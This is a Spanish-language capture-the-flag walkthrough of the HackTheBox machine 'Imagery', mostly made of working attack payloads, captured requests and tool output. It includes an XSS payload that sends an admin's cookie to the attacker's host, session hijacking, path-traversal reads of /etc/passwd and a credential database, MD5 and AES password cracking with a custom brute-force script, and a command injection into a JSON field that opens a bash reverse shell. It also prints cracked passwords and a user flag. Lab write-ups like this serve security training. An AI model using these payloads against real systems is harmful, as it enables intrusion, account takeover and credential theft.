---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Imagery HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 14:45 EDT
Nmap scan report for 10.10.11.88
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.65 seconds
```

Veremos que hay varios puertos interesantes entre ellos veremos un puerto `8000` el cual hay un `python3` como servidor, si entramos dentro veremos una pagina web por lo que podremos creer que hay un server de tipo `Flask`.

Investigando un poco veremos que hay un boton llamado `login`, en el cual si entramos dentro veremos efectivamente un `login`, pero tambien a parte veremos un `registro` un poco mas abajo, si nos registramos con un `email` junto con una contraseña cualquiera, nos lleva al `login` de nuevo, metiendo dichas credenciales registradas veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251003205510.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos subir un archivo a la pagina en nuestro panel, pero solamente tienen que ser imagenes por lo que vemos.

Si bajamos en el `footer` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20251003211407.png" alt=""><figcaption></figcaption></figure>

Vemos que hay una opcion mas en la cual no esta en la barra normal de arriba, si le damos veremos esta pagina:

<figure><img src="../../.gitbook/assets/Pasted image 20251003211438.png" alt=""><figcaption></figcaption></figure>

Cuando vayamos a enviar el reporte, abrimos `BurpSuite` nos pondremos a la escucha para interceptar la peticion, ahora si enviamos la peticion y tenemos `BurpSuite` a la escucha veremos la siguiente peticion capturada:

```
POST /report_bug HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.88:8000/
Content-Type: application/json
Content-Length: 46
Origin: http://10.10.11.88:8000
Connection: keep-alive
Cookie: session=.eJyrVkrJLC7ISaz0TFGyUkq0ME4xTzVMUdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAJosLr0.aOAcVA.cAPdTsCKIzoAvuSshDJoX37uDjk
Priority: u=0

{"bugName":"<h1>XSS</h1>","bugDetails":"test"}
```

Vemos que esta utilizando `JSON` para enviar la informacion, si probamos a enviar un `XSS` de esta forma, en la respuesta veremos esto:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 03 Oct 2025 19:23:04 GMT
Content-Type: application/json
Content-Length: 78
Vary: Cookie
Connection: close

{"message":"Bug report submitted. Admin review in progress. ","success":true}
```

Vemos que no dio ningun error, pero tampoco nos dio una informacion visual de si se esta reflejando o no, por lo que vamos a probar un `XSS` que intente obtener la `Cookie` del usuario que le llegue dicho mensaje.

```
POST /report_bug HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.88:8000/
Content-Type: application/json
Content-Length: 108
Origin: http://10.10.11.88:8000
Connection: keep-alive
Cookie: session=.eJyrVkrJLC7ISaz0TFGyUkq0ME4xTzVMUdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCLzk_V6kWAJosLr0.aOAcVA.cAPdTsCKIzoAvuSshDJoX37uDjk
Priority: u=0

{"bugName":"test","bugDetails":"\"><img src=x onerror=\"fetch('http://10.10.14.64/?c='+document.cookie)\">"}
```

Antes de enviarlo nos pondremos a la escucha para que nos llegue la peticion cuando alguien entre a dicho mensaje.

```shell
python3 -m http.server 80
```

Si esperamos un rato despues de enviar la peticion con `BurpSuite` veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.88 - - [04/Oct/2025 03:13:12] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aODJBQ.FIjiSGV8BLU_ajCsJdIS0UH9Nkk HTTP/1.1" 200 -
```

Veremos que ha funcionado, vamos a irnos al `Storage` de nuestro navegador e intercambiar la `Cookie` nuestra por la que hemos recibido a ver que pasa.

Una vez cambiado y recargada la pagina veremos una opcion llamada `Admin panel`, si entramos dentro veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-04 091444.png" alt=""><figcaption></figcaption></figure>

Vemos que podemos descargarnos un archivo, vamos a capturar la peticion con `BurpSuite` para ver que esta pasando por detras, si le damos a descargar y la interceptamos...

```
GET /admin/get_system_log?log_identifier=admin%40imagery.htb.log HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://10.10.11.88:8000/
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aODJBQ.FIjiSGV8BLU_ajCsJdIS0UH9Nkk
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

Vemos que esta llamando a un parametro en concreto para descargar un archivo, vamos a probar si esto pudiera ser vulnerable a un `LFI` de esta forma:

```
URL = http://<IP>:8000/admin/get_system_log?log_identifier=../../../../etc/passwd
```

Veremos que efectivamente nos descarga un archivo y si lo leemos:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

Con esto confirmamos que efectivamente si hay un `LFI`.

Despues de un rato investigando por los `paths` encontramos un `db.json` de esta forma:

```
URL = http://<IP>:8000/admin/get_system_log?log_identifier=../db.json
```

Info:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

Vemos que obtenemos `2` contraseñas de dos usuarios, uno el `admin` y el otro de `testuser`, vamos a intentar `crackear` las dos contraseñas a ver si hay suerte.

## John (Crack Hash)

> hash

```
admin:5d9c1d507a3f76af1e5c97a3ad1eaa31
testuser:2c65c8d7bfbca32a3ed42596192384f6
```

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
iambatman        (testuser)     
1g 0:00:00:00 DONE (2025-10-04 03:34) 1.298g/s 18627Kp/s 18627Kc/s 18943KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que nos ha descargado la del usuario `testuser`, si probamos a meternos dentro con dicha contraseña en la pagina, veremos lo siguiente:

```
email: testuser@imagery.htb
pass: iambatman
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-04 093633.png" alt=""><figcaption></figcaption></figure>

Veremos que en las opciones que antes teniamos bloqueadas, ahora estan desbloqueadas, por lo que vamos a investigar por aqui.

## Escalate user web

Si nos vamos a `Transform Image` veremos a nivel de peticion esto si lo capturamos con `BurpSuite`:

```
POST /apply_visual_transform HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.88:8000/
Content-Type: application/json
Content-Length: 148
Origin: http://10.10.11.88:8000
Connection: keep-alive
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aODObA.AyvVMpCmpZu7T2rEhILFmICqF-Q
Priority: u=0

{"imageId":"9bb59b7d-ed61-4245-8590-515a79d2bc7e","transformType":"crop","params":{"x":1,"y":0,"width":486,"height":567}}
```

Si probamos en cualquiera de los parametros de la `x` para abajo poniendo este `payload`:

```
"; curl http://<IP_ATTACKER>/"
```

Para intentar concatenar cualquier comando que se este ejecutando por detras y despues que nos llegue una peticion a ver si se esta ejecutando bien quedando la peticion de esta forma:

```
POST /apply_visual_transform HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.88:8000/
Content-Type: application/json
Content-Length: 146
Origin: http://10.10.11.88:8000
Connection: keep-alive
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aODObA.AyvVMpCmpZu7T2rEhILFmICqF-Q
Priority: u=0

{"imageId":"9bb59b7d-ed61-4245-8590-515a79d2bc7e","transformType":"crop","params":{"x":1,"y":0,"width":"; curl http://<IP_ATTACKER>/","height":567}}
```

Abriremos un servidor de `python3`.

```shell
python3 -m http.server 80
```

Ahora si enviamos la peticion nos llegara a nuestro servidor esto:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.88 - - [04/Oct/2025 03:45:49] code 404, message File not found
```

Veremos que funciona, por lo que vamos a probar a realizar una `reverse shell` de esta forma:

```
POST /apply_visual_transform HTTP/1.1
Host: 10.10.11.88:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.88:8000/
Content-Type: application/json
Content-Length: 146
Origin: http://10.10.11.88:8000
Connection: keep-alive
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aODObA.AyvVMpCmpZu7T2rEhILFmICqF-Q
Priority: u=0

{"imageId":"9bb59b7d-ed61-4245-8590-515a79d2bc7e","transformType":"crop","params":{"x":1,"y":0,"width":"; /bin/bash -c \"/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\";","height":567}}
```

Hay que realizar otra `;` al final para concatenar otro comando que se estaba ejecutando por detras, ya que si no, da error, pero antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos la peticion con ese `payload` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.11.88] 41506
bash: cannot set terminal process group (1334): Inappropriate ioctl for device
bash: no job control in this shell
web@Imagery:~/web$ whoami
whoami
web
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user mark

Si investigamos un poco veremos que hay un directorio bastante interesante que es el siguiente:

```shell
ls -la /var/backup/
```

Info:

```
total 22524
drwxr-xr-x  2 root root     4096 Sep 22 18:56 .
drwxr-xr-x 14 root root     4096 Sep 22 18:56 ..
-rw-rw-r--  1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

Vemos un archivo comprimido pero con una encriptacion de `AES` por lo que vamos a pasarnoslo a nuestra maquina atacante.

```shell
python3 -m http.server 8080
```

Ahora en la maquina atacante nos descargamos el archivo.

```shell
wget http://<IP>:8080/web_20250806_120723.zip.aes
```

Una vez descargado, vamos a crearnos un script para realizar fuerza bruta de dicho archivo con este script.

> bruteAES.py

```python
#!/usr/bin/env python3
import pyAesCrypt
import os
import sys
import time

def decrypt_with_rockyou(aes_file, rockyou_path, output_file="decrypted.zip"):
    """
    Descifra un archivo .aes usando rockyou.txt como wordlist
    """
    bufferSize = 64 * 1024
    attempts = 0
    start_time = time.time()
    
    # Verificar que rockyou.txt existe
    if not os.path.exists(rockyou_path):
        print(f"Error: {rockyou_path} no encontrado")
        return None
    
    # Verificar que el archivo .aes existe
    if not os.path.exists(aes_file):
        print(f"Error: {aes_file} no encontrado")
        return None
    
    print(f"[*] Iniciando fuerza bruta con {rockyou_path}")
    print(f"[*] Archivo a descifrar: {aes_file}")
    print(f"[*] Progreso: ", end="", flush=True)
    
    try:
        with open(rockyou_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                attempts += 1
                
                # Mostrar progreso cada 1000 intentos
                if attempts % 1000 == 0:
                    print(f"{attempts}...", end="", flush=True)
                
                # Saltar líneas vacías
                if not password:
                    continue
                
                try:
                    # Intentar descifrar
                    pyAesCrypt.decryptFile(aes_file, output_file, password, bufferSize)
                    
                    # Verificar si el archivo descifrado es un ZIP válido
                    if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                        with open(output_file, 'rb') as check_file:
                            header = check_file.read(4)
                            if header == b'PK\x03\x04':  # Cabecera ZIP válida
                                end_time = time.time()
                                print(f"\n[SUCCESS] ¡Contraseña encontrada!")
                                print(f"[SUCCESS] Contraseña: {password}")
                                print(f"[SUCCESS] Intentos: {attempts}")
                                print(f"[SUCCESS] Tiempo: {end_time - start_time:.2f} segundos")
                                print(f"[SUCCESS] Archivo descifrado: {output_file}")
                                return password
                        
                        # Si no es ZIP válido, eliminar
                        os.remove(output_file)
                        
                except Exception:
                    # Password incorrecta, continuar
                    if os.path.exists(output_file):
                        os.remove(output_file)
                    continue
                    
    except KeyboardInterrupt:
        print(f"\n[*] Interrumpido por el usuario")
        print(f"[*] Total de intentos: {attempts}")
        return None
    
    print(f"\n[-] Contraseña no encontrada en rockyou.txt")
    print(f"[-] Total de intentos: {attempts}")
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 brute_aes.py <archivo.aes> <ruta/rockyou.txt>")
        print("Ejemplo: python3 brute_aes.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt")
        sys.exit(1)
    
    aes_file = sys.argv[1]
    rockyou_path = sys.argv[2]
    
    password = decrypt_with_rockyou(aes_file, rockyou_path)
    
    if password:
        print("\n[+] ¡Archivo descifrado exitosamente!")
        # Verificar el contenido
        if os.path.exists("decrypted.zip"):
            print("[+] Verificando contenido...")
            os.system("file decrypted.zip")
            os.system("unzip -l decrypted.zip 2>/dev/null || echo 'No se puede listar el contenido'")
    else:
        print("\n[-] No se pudo descifrar el archivo")
```

Ahora lo ejecutamos de esta forma:

```shell
python3 bruteAES.py web_20250806_120723.zip.aes <WORDLIST>
```

Info:

```
[*] Iniciando fuerza bruta con /usr/share/wordlists/rockyou.txt
[*] Archivo a descifrar: web_20250806_120723.zip.aes
[*] Progreso: 
[SUCCESS] ¡Contraseña encontrada!
[SUCCESS] Contraseña: bestfriends
[SUCCESS] Intentos: 670
[SUCCESS] Tiempo: 8.07 segundos
[SUCCESS] Archivo descifrado: decrypted.zip

[+] ¡Archivo descifrado exitosamente!
[+] Verificando contenido...
decrypted.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
Archive:  decrypted.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     4023  2025-08-05 09:00   web/utils.py
     9091  2025-08-05 08:57   web/api_manage.py
      840  2025-08-05 08:58   web/api_misc.py
     6398  2025-08-05 08:56   web/api_auth.py
     1809  2025-08-05 08:59   web/config.py
     1943  2025-08-05 15:21   web/app.py
     9784  2025-08-05 08:56   web/api_admin.py
    12082  2025-08-05 08:58   web/api_upload.py
     1503  2025-08-06 12:07   web/db.json
    11876  2025-08-05 08:57   web/api_edit.py
     7413  2025-08-05 15:49   web/__pycache__/api_auth.cpython-312.pyc
     2399  2025-08-05 15:49   web/__pycache__/config.cpython-312.pyc
    15349  2025-08-05 15:49   web/__pycache__/api_upload.cpython-312.pyc
     1553  2025-08-05 15:49   web/__pycache__/api_misc.cpython-312.pyc
    15261  2025-08-05 15:49   web/__pycache__/api_edit.cpython-312.pyc
     7003  2025-08-05 15:49   web/__pycache__/utils.cpython-312.pyc
    11411  2025-08-05 15:49   web/__pycache__/api_manage.cpython-312.pyc
    12058  2025-08-05 15:49   web/__pycache__/api_admin.cpython-312.pyc
   151895  2025-08-01 05:49   web/templates/index.html
      742  2025-08-06 12:07   web/system_logs/admin@imagery.htb.log
.............................<RESTO DE CODIGO>.....................................
```

Veremos que hemos encontrado la contraseña llamada `bestfriends`, por lo que nos da el archivo directamente `.zip`.

```shell
unzip decrypted.zip
```

Esto nos descomprimira el `backup` de la `web`, vamos a investigar que contiene y si tiene algo interesante.

Si leemos de nuevo el archivo `db.json` veremos lo siguiente:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

Veremos que hay un usuario mas llamado `mark` y si leemos el `passwd` veremos que existe un usuario a nivel de sistema llamado `mark`, por lo que vamos a probar a `crackear` la contraseña.

> hash

```
mark:01c3d2e5bdaf6134cec0a367cf53e535
```

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
supersmash       (mark)     
1g 0:00:00:00 DONE (2025-10-04 04:12) 50.00g/s 12969Kp/s 12969Kc/s 12969KC/s swilly..sugar*
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y obtenemos la contraseña de dicho usuario, vamos a probar a escalar al usuario desde la `shell` que tenemos haciendo esto:

```shell
su mark
```

Metemos como contraseña `supersmash`...

```
bash-5.2$ whoami
mark
```

Con esto veremos que seremos dicho usuario, por lo que leeremos la `flag` de usuario.

> user.txt

```
779c8962d92d0453d471ef6328978b56
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

Vemos que podemos ejecutar el binario `charcol` como el usuario `root`, por lo que vamos a investigar que hace.

Si listamos el `help` del comando veremos que nos puede meter en una `shell` propia del binario.

```shell
sudo charcol shell
```

Info:

```

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-04 08:20:02] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol>
```

Dentro de la misma si hacemos `help` veremos lo siguiente:

```
[2025-10-04 08:20:07] [INFO] 
Charcol Shell Commands:

  Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

